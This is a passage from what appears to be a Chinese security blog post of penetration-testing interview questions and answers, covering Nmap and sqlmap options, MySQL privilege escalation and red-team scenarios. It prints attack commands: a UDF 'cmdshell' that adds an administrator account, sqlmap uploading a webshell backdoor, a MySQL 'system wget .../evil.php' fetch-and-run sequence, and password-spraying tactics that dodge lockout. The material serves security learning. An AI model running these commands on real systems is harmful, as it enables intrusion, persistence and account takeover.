+<h4 id="代码审计的方法和常规步骤？"><a href="#代码审计的方法和常规步骤？" class="headerlink" title="代码审计的方法和常规步骤？"></a>代码审计的方法和常规步骤？</h4><h4 id="都会哪些语言？"><a href="#都会哪些语言？" class="headerlink" title="都会哪些语言？"></a>都会哪些语言？</h4><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h4 id="PHP5环境下，如果配置文件中magic-quotes-gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？"><a href="#PHP5环境下，如果配置文件中magic-quotes-gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？" class="headerlink" title="PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？"></a>PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</h4><p><code>&#39;</code>、<code>&quot;</code>、<code>\</code></p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h4 id="用过哪些扫描工具，各有什么特点以及区别？"><a href="#用过哪些扫描工具，各有什么特点以及区别？" class="headerlink" title="用过哪些扫描工具，各有什么特点以及区别？"></a>用过哪些扫描工具，各有什么特点以及区别？</h4><p>AWVS 扫描Web漏洞<br>Nessus 扫描服务器漏洞，专业版可以导出中文报告<br>Appscan 扫描Web漏洞，支持导出中文报告</p>
+<h4 id="Nmap中，-sT，-sP，-sA，-oN分别表示什么？"><a href="#Nmap中，-sT，-sP，-sA，-oN分别表示什么？" class="headerlink" title="Nmap中，-sT，-sP，-sA，-oN分别表示什么？"></a>Nmap中，-sT，-sP，-sA，-oN分别表示什么？</h4><p>-sT表示TCP方式扫描，对目标端口建立连接，会留下连接记录<br>-sP表示Ping方式扫描<br>-sA表示TCP ACK方式扫描<br>-oN表示标准输出</p>
+<h4 id="对Nmap的脚本引擎了解吗？"><a href="#对Nmap的脚本引擎了解吗？" class="headerlink" title="对Nmap的脚本引擎了解吗？"></a>对Nmap的脚本引擎了解吗？</h4><p>–script</p>
+<h4 id="使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。"><a href="#使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。" class="headerlink" title="使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。"></a>使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</h4><p><code>--os-shell</code></p>
+<h4 id="SQLMAP中指定测试参数用什么命令？"><a href="#SQLMAP中指定测试参数用什么命令？" class="headerlink" title="SQLMAP中指定测试参数用什么命令？"></a>SQLMAP中指定测试参数用什么命令？</h4><p><code>-p &quot;parameter&quot;</code></p>
+<h4 id="SQLMAP中POST型注入怎么注入？"><a href="#SQLMAP中POST型注入怎么注入？" class="headerlink" title="SQLMAP中POST型注入怎么注入？"></a>SQLMAP中POST型注入怎么注入？</h4><p>1.保存POST请求包，然后使用<code>-r request.txt</code><br>2.<code>--data=请求数据</code></p>
+<h4 id="SQLMAP中查询所有用户的角色？"><a href="#SQLMAP中查询所有用户的角色？" class="headerlink" title="SQLMAP中查询所有用户的角色？"></a>SQLMAP中查询所有用户的角色？</h4><p>查询所有用户<code>--users</code><br>查询角色<code>--roles</code></p>
+<h4 id="暴力破解工具有哪些？B-S？C-S？"><a href="#暴力破解工具有哪些？B-S？C-S？" class="headerlink" title="暴力破解工具有哪些？B/S？C/S？"></a>暴力破解工具有哪些？B/S？C/S？</h4><h4 id="破解Hash密码的方式？"><a href="#破解Hash密码的方式？" class="headerlink" title="破解Hash密码的方式？"></a>破解Hash密码的方式？</h4><p>彩虹表</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h4 id="提权分类？"><a href="#提权分类？" class="headerlink" title="提权分类？"></a>提权分类？</h4><p>内核提权<br>第三方服务<br>安全配置不当</p>
+<h4 id="MySQL提权分几种，不同系统有什么差异？"><a href="#MySQL提权分几种，不同系统有什么差异？" class="headerlink" title="MySQL提权分几种，不同系统有什么差异？"></a>MySQL提权分几种，不同系统有什么差异？</h4><p>a.MOF提权</p>
+<p>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</p>
+<p>利用条件：mysql用户具有root权限，关闭了secure-file-priv</p>
+<p>b.UDF提权</p>
+<p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限</p>
+<p>利用条件：<br>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。<br>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。<br>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备<code>root</code>账号所具备的权限的其它账号也可以。<br>以将udf.dll写入到相应目录的权限。</p>
+<p>利用方式：<br>将dll文件导入到相应目录，如果导入错误会产生can’t open shared library错误<br>创建自定义函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; #删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  #删除函数</span><br></pre></td></tr></table></figure>
+<p>Windows系统和Linux系统上的DLL库位置不同</p>
+<p>sqlmap找到Mysql插件目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://&quot; --sql-shell</span><br><span class="line">show variables like &quot;%plugin%&quot;</span><br></pre></td></tr></table></figure>
+<p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://&quot; --file-write=/lib_mysqludf_sys.so --file-dest=/usr/lib/mysql/plugin/</span><br></pre></td></tr></table></figure>
+<p>激活存储过程<code>sys_exec</code>函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</span><br><span class="line">SELECT * FROM information_schema.routines</span><br><span class="line">sys_exec(id);</span><br></pre></td></tr></table></figure>
+<p>利用sqlmap上传后门程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;http://xxx&apos;  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php</span><br></pre></td></tr></table></figure>
+<p>c.mysql5.x for Linux下有system函数，可以执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;system vi /etc/httpd/conf/httpd.conf;</span><br><span class="line">mysql&gt;system wget http://baidu.com/evil.php</span><br><span class="line">mysql&gt;system chmod +x evil.php</span><br><span class="line">mysql&gt;system ./evil.php</span><br></pre></td></tr></table></figure>
+<p>可以下载MSF生成的反弹shell脚本，本地运行反弹shell，权限根据启动mysql的用户身份来决定</p>
+<h2 id="具体场景"><a href="#具体场景" class="headerlink" title="具体场景"></a>具体场景</h2><h4 id="考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete-php-article-id-24，请考虑这个地方最有可能出现哪些安全问题？"><a href="#考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete-php-article-id-24，请考虑这个地方最有可能出现哪些安全问题？" class="headerlink" title="考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？"></a>考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</h4><p>CSRF、越权</p>
+<h4 id="有文件包含，但没有上传点的站怎么GetShell？"><a href="#有文件包含，但没有上传点的站怎么GetShell？" class="headerlink" title="有文件包含，但没有上传点的站怎么GetShell？"></a>有文件包含，但没有上传点的站怎么GetShell？</h4><p>访问含有一句话的URL，会记录在日志里，文件包含日志<br>PHP伪协议</p>
+<h1 id="红队面试题"><a href="#红队面试题" class="headerlink" title="红队面试题"></a>红队面试题</h1><p>来源：<a href="https://github.com/Leezj9671/offensiveinterview" target="_blank" rel="noopener">https://github.com/Leezj9671/offensiveinterview</a></p>
+<h2 id="开放式问题"><a href="#开放式问题" class="headerlink" title="开放式问题"></a>开放式问题</h2><h3 id="技术问题"><a href="#技术问题" class="headerlink" title="技术问题"></a>技术问题</h3><h4 id="常规渗透"><a href="#常规渗透" class="headerlink" title="常规渗透"></a>常规渗透</h4><h5 id="2-在渗透测试期间，你找到了一个运行于客户端的-Outlook-Web-Access-实例。你将如何攻击它？"><a href="#2-在渗透测试期间，你找到了一个运行于客户端的-Outlook-Web-Access-实例。你将如何攻击它？" class="headerlink" title="2.在渗透测试期间，你找到了一个运行于客户端的 Outlook Web Access 实例。你将如何攻击它？"></a>2.在渗透测试期间，你找到了一个运行于客户端的 Outlook Web Access 实例。你将如何攻击它？</h5><ol>
+<li>描述如何找到可能的用户名。 <em>（如果他们没有回答）</em></li>
+<li>描述如何选择使用哪些密码。 <em>（如果他们没有回答）</em></li>
+<li>描述如何避免帐户锁定。 <em>（如果他们没有回答）</em></li>
+</ol>
+<p>Outlook的Web控制SMB，这意味着如果能够找出域账户名称的构成语法，就可以尝试使用通用密码进行身份验证。需要注意锁定阈值，在快达到阈值时，换一个用户进行爆破。寻找可能的用户名，使用GoogleHacking，<code>incontent:*@company.com</code>，根据用户名，进一步搜索个人信息，根据个人信息，按照中国人喜欢的密码规则生成字典进行爆破。避免锁定，找到锁定次数和锁定时间，找到之后，在快达到锁定次数时，更换用户名继续爆破，生成足够多的用户名，爆破一轮的时间足够可以重置锁定时间。</p>
+<p>用户名或邮箱可以从社工库，Google，Baidu，Linkedin，钟馗之眼等等获得。</p>
+<h5 id="3-如果你在没有root权限的情况下运行以下扫描-nmap-www-google-com"><a href="#3-如果你在没有root权限的情况下运行以下扫描-nmap-www-google-com" class="headerlink" title="3.如果你在没有root权限的情况下运行以下扫描 nmap www.google.com"></a>3.如果你在没有root权限的情况下运行以下扫描 <code>nmap www.google.com</code></h5><ol>
+<li>进行了什么样的扫描？ <em>（如果他们没有回答）</em></li>
+<li>扫描了多少个端口？ <em>（如果他们没有回答）</em></li>
+<li>如果你以 root 身份运行相同的命令，请描述它们之间的差异。 <em>（如果他们没有回答）</em></li>
+</ol>
+<p>Nmap在拥有root权限时，默认使用<code>-sS</code>方式扫描，发送SYN包，在没有root权限时，默认使用<code>-sT</code>，使用connect()系统调用；扫描1-1024端口以及<code>nmap-services</code>文件中的端口，大概27000个端口，包括TCP和UDP，<code>nmap-services</code>是nmap作者对整个互联网进行扫描后，对开放端口情况的统计结果。</p>
+<h5 id="4-你正在对一个已知的、比较脆弱的主机启动-Metasploit-发出了一个-reverse-https-meterpreter-payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试-或者你将更改为什么-得到你的-meterpreter-session？"><a href="#4-你正在对一个已知的、比较脆弱的主机启动-Metasploit-发出了一个-reverse-https-meterpreter-payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试-或者你将更改为什么-得到你的-meterpreter-session？" class="headerlink" title="4.你正在对一个已知的、比较脆弱的主机启动 Metasploit 发出了一个 reverse https meterpreter payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试(或者你将更改为什么)得到你的 meterpreter session？"></a>4.你正在对一个已知的、比较脆弱的主机启动 Metasploit 发出了一个 reverse https meterpreter payload，但是一旦你键入“exploit”，它在启动攻击后没有任何反应，你将如何调试(或者你将更改为什么)得到你的 meterpreter session？</h5><p>设置payload为reverse_tcp，不使用HTTPS</p>
+<h5 id="8-假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？"><a href="#8-假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？" class="headerlink" title="8.假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？"></a>8.假设你可以对测试中的公司域上的计算机有物理访问的权限，该机器已经连接到了内网。你没有域或本地计算机的凭据，但你有自己的电脑，你会如何开始测试？</h5><p>收集员工邮箱，对用户名、密码进行爆破，注意避免锁定。</p>
+<p>碰撞出用户名和密码之后，可以使用Ruler进一步收集信息。</p>
+<p>获得用户名:密码后，可以使用以下命令，在本机运行PowerShell，可以避免往域中机器上传文件，不会触发病毒防护软件，也不用再把数据传回自己机器中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:Druid.com\User1 powershell</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/09/Nmap-Usage/" rel="next" title="'Nmap-Usage'">
+                <i class="fa fa-chevron-left"></i> 'Nmap-Usage'
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/08/VulnHub-LazySysAdmin/" rel="prev" title="'VulnHub-LazySysAdmin'">
+                'VulnHub-LazySysAdmin' <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/cat.jpg" alt="chessur">
+            
+              <p class="site-author-name" itemprop="name">chessur</p>
+              <div class="site-description motion-element" itemprop="description">Freedom as Autonomy</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">36</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入时，注入点是数值型注入，不触发WAF的payload"><span class="nav-text">SQL注入时，注入点是数值型注入，不触发WAF的payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入可以做什么，写出针对于www-baidu-com-id-1的测试流程？"><span class="nav-text">SQL注入可以做什么，写出针对于www.baidu.com?id=1的测试流程？</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试流程"><span class="nav-text">测试流程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#了解过哪些数据库的注入？"><span class="nav-text">了解过哪些数据库的注入？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入可以采取什么方法修复？描述每种方法的利弊。"><span class="nav-text">SQL注入可以采取什么方法修复？描述每种方法的利弊。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#宽字节注入的原理？"><span class="nav-text">宽字节注入的原理？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次编码注入的原理？"><span class="nav-text">二次编码注入的原理？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#渗透时后端环境是apache-php-mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1-mysql用户需要有（）权限；2-需要知道（）路径；3-（）（符号）不能被过滤。"><span class="nav-text">渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二次注入的原理？"><span class="nav-text">二次注入的原理？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如果存在SQL注入怎么判断不同类型的数据库？"><span class="nav-text">如果存在SQL注入怎么判断不同类型的数据库？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入的函数有哪些？"><span class="nav-text">报错注入的函数有哪些？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQL注入的类型"><span class="nav-text">SQL注入的类型</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传"><span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见的一句话有哪些？木马的变形有哪些方式？"><span class="nav-text">常见的一句话有哪些？木马的变形有哪些方式？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传漏洞的原理？"><span class="nav-text">文件上传漏洞的原理？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过文件上传的技巧有哪些"><span class="nav-text">绕过文件上传的技巧有哪些?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编辑器漏洞有了解码？"><span class="nav-text">编辑器漏洞有了解码？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#说说解析漏洞？"><span class="nav-text">说说解析漏洞？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞的原理，分类，条件？"><span class="nav-text">文件包含漏洞的原理，分类，条件？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件包含漏洞伪协议有哪些？"><span class="nav-text">文件包含漏洞伪协议有哪些？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行、代码执行的原理？"><span class="nav-text">命令执行、代码执行的原理？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS可以做什么？写出不同场景下的Payload思路？"><span class="nav-text">XSS可以做什么？写出不同场景下的Payload思路？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-payload的变形方式？"><span class="nav-text">XSS payload的变形方式？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于-lt-www-baidu-com-id-1-gt-的测试流程？"><span class="nav-text">XSS分哪几种类型，描述每种XSS类型的发生流程。写出针对于&lt;www.baidu.com?id=1&gt;的测试流程？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？"><span class="nav-text">XSS防御方案怎么做，不同场景下是否会使用不同的方案，比如：搜索业务、博客？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS获取屏幕截图，屏幕截图的范围"><span class="nav-text">XSS获取屏幕截图，屏幕截图的范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#简述下浏览器的自解码机制。"><span class="nav-text">简述下浏览器的自解码机制。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie"><span class="nav-text">网站存在phpinfo页面，设置HTTP-Only，如何使用XSS盗取Cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF"><span class="nav-text">CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF漏洞的原理是什么？怎么修复？"><span class="nav-text">CSRF漏洞的原理是什么？怎么修复？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE漏洞原理以及利用方式？"><span class="nav-text">XXE漏洞原理以及利用方式？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-text">SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。"><span class="nav-text">SSRF可以用来做什么，哪些场景容易产生这个类型的漏洞？写出不同场景下的Payload思路。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF漏洞修复方案怎么做，难点在哪？"><span class="nav-text">SSRF漏洞修复方案怎么做，难点在哪？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF绕过方式"><span class="nav-text">SSRF绕过方式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反序列化漏洞"><span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化漏洞有哪些？是否懂原理？"><span class="nav-text">反序列化漏洞有哪些？是否懂原理？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内网"><span class="nav-text">内网</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#欺骗和嗅探的原理？工具？"><span class="nav-text">欺骗和嗅探的原理？工具？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域"><span class="nav-text">域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#虚拟机"><span class="nav-text">虚拟机</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#VMWare的网络模式"><span class="nav-text">VMWare的网络模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web容器"><span class="nav-text">Web容器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web容器有哪些？"><span class="nav-text">Web容器有哪些？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP协议"><span class="nav-text">HTTP协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTTP请求方式有哪些？"><span class="nav-text">HTTP请求方式有哪些？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#状态码"><span class="nav-text">状态码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？"><span class="nav-text">在HTTP请求头中user-agent、referer、cookie、x-forward-for、content-type分别表示什么？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安全设备"><span class="nav-text">安全设备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WAF绕过的方法有哪些？"><span class="nav-text">WAF绕过的方法有哪些？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#哪些漏洞WAF防御不了？"><span class="nav-text">哪些漏洞WAF防御不了？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？"><span class="nav-text">Session和Cookie有什么区别，Cookie伪造以及Session伪造漏洞的发生原因是什么？怎么修复？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#什么是指纹识别？"><span class="nav-text">什么是指纹识别？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写过博客吗？日常的学习过程关注哪些安全平台？"><span class="nav-text">写过博客吗？日常的学习过程关注哪些安全平台？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后期工作规划？"><span class="nav-text">后期工作规划？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#薪资待遇有什么想法？"><span class="nav-text">薪资待遇有什么想法？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？"><span class="nav-text">之前没从事过安全方面的工作，为什么要现在要从事这方面的工作？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透流程"><span class="nav-text">渗透流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拿到目标站怎么进行渗透，需要注意什么。"><span class="nav-text">拿到目标站怎么进行渗透，需要注意什么。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CDN技术有了解码？如何绕过CDN寻找站点真实IP？"><span class="nav-text">CDN技术有了解码？如何绕过CDN寻找站点真实IP？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码审计"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#代码审计怎么做？"><span class="nav-text">代码审计怎么做？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码审计的方法和常规步骤？"><span class="nav-text">代码审计的方法和常规步骤？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#都会哪些语言？"><span class="nav-text">都会哪些语言？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP5环境下，如果配置文件中magic-quotes-gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？"><span class="nav-text">PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具"><span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#用过哪些扫描工具，各有什么特点以及区别？"><span class="nav-text">用过哪些扫描工具，各有什么特点以及区别？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nmap中，-sT，-sP，-sA，-oN分别表示什么？"><span class="nav-text">Nmap中，-sT，-sP，-sA，-oN分别表示什么？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#对Nmap的脚本引擎了解吗？"><span class="nav-text">对Nmap的脚本引擎了解吗？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。"><span class="nav-text">使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMAP中指定测试参数用什么命令？"><span class="nav-text">SQLMAP中指定测试参数用什么命令？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 